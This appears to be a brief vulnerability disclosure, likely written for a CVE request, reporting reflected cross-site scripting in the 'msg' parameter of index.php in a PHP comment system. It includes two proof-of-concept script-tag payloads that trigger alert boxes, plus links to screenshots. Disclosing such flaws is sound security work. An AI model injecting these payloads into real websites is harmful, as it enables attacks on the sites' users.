# Comment System v1.0 has reflected cross-site scripting vulnerability

BUG_Author: kanyulu

Website source code address: https://www.sourcecodester.com/php/14713/comment-system-phpmysqli-full-source-code.html

Vulnerability File: /Comment_System/index.php

GET parameter "msg" exists reflected cross-site scripting vulnerability

Payload1: msg=<script>alert('xss')</script>

![image](https://github.com/kanyl6/CVERequest/blob/main/1.png)

Payload2: msg=<script>alert(789)</script>

![image](https://github.com/kanyl6/CVERequest/blob/main/2.png)
